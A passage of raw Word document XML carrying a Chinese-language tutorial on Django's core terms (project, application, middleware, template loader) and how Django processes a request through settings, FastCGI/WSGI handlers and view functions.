          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的时候，我们经常听到一些术语：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC2DF65"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Project</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4200E8AD"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指一个完整的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>服务，一般由多个模块组成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EB1D86"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Application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D86E01"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可以理解为模块，比如用户管理、博客管理等，包含了数据的组成和数据的显示，</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Applicaiton</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INSTALLED_APPS </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7700EB69"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Middleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79540D2F"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就是处理request和response的插件, Middleware都需要在 “project/settings.py” 中 MIDDLEWARE_CLASSES 的定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288AAF99"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Loader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7F4D3B"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模板加载器</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其实就是为了读取</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Template </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>文件的类，默认的有通过文件系统加载和在</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> “Application/templates” </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>目录中加载，</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Loader</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TEMPLATE_LOADERS </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC2C9AC" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="58" w:name="t4"/>
      <w:bookmarkEnd w:id="58"/>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>五、</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>处理流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BF7B11"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其实和其他</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架一样，</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处理的流程大致相同，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E0FBC4"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lastRenderedPageBreak/>
        <w:t>Django处理一个Request的过程是首先通过中间件，然后再通过默认的URL方式进行的。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>我们可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>这个地方把所有</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Request</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>拦截住，用我们自己的方式完成处理以后直接返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122757B6"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1. 加载配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5C9BDD"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Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的配置都在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> “Project/settings.py” </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中定义，可以是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的配置，也</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可以是自定义的配置，并且都通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.conf.settings </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>访问，非常方便。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD43059"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2. 启动</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="704F8F9C"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最核心动作的是通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.management.commands.runfcgi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Command </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>来启动，它运行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.servers.fastcgi </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> runfastcgi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runfastcgi </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>使用了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> flup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WSGIServer </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>来启动</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> fastcgi </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。而</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGIServer </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中携带了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.handlers.wsgi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WSGIHandler </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>类的一个实例，通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGIHandler</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>来处理由</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>服务器</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比如</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Apache</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Lighttpd</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>等</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传过来的请求，此</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时才是真正进入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的世界。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3745463D"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3. 处理 Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A461A8"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当有</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>请求来时，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGIHandler </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>就开始工作了</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它从</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> BaseHandler </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>继承而来。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGIHandler </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>为每个请求创建一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGIRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实例，而</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGIRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>是从</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> http.HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>继承而来。接下来就开始创建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了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78435F84"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4. 创建Response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB443F6"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BaseHandler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get_response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法就是根据</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创建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而</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>具体生成 response 的动作就是执行 urls.py 中对应的view函数了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，这也是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
